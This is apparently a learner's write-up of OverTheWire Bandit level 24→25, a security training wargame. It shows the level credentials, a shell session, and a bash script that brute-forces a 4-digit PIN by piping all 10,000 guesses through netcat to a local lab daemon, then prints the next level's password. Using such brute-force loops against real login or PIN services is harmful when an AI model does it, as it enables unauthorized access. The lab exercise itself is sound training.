# Bandit Level 24 → Level 25

## 🧠 Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time
---

## 🔐 Credentials

- **Username:** `bandit24`
- **Host:** `bandit.labs.overthewire.org`
- **Port:** `2220`
- **Password:** `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

---

## 🖥️ Commands Used

```bash
bandit24@bandit:~$ mktemp -d /tmp/amro.XXX
/tmp/amro.UlA
bandit24@bandit:~$ cd /tmp/amro.ULA
-bash: cd: /tmp/amro.ULA: No such file or directory
bandit24@bandit:~$ /tmp/amro.UlA
-bash: /tmp/amro.UlA: Is a directory
bandit24@bandit:~$ cd /tmp/amro.UlA
bandit24@bandit:/tmp/amro.UlA$ nano brute_force.sh
```
#!/bin/bash
for i in {0000..9999}
do
        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> try_me.txt
done
cat try_me.txt | nc localhost 30002 >> result.txt
```bash
bandit24@bandit:/tmp/amro.UlA$ ls
brute_force.sh
bandit24@bandit:/tmp/amro.UlA$ chmod +x brute_force.sh
bandit24@bandit:/tmp/amro.UlA$ ls
brute_force.sh
bandit24@bandit:/tmp/amro.UlA$ ./brute_force.sh
bandit24@bandit:/tmp/amro.UlA$ ls
brute_force.sh  result.txt  try_me.txt
bandit24@bandit:/tmp/amro.UlA$ grep -v "Wrong" result.txt
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
___

## 💡 Tips
```bash


```
___

## 📤 Output
```bash
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

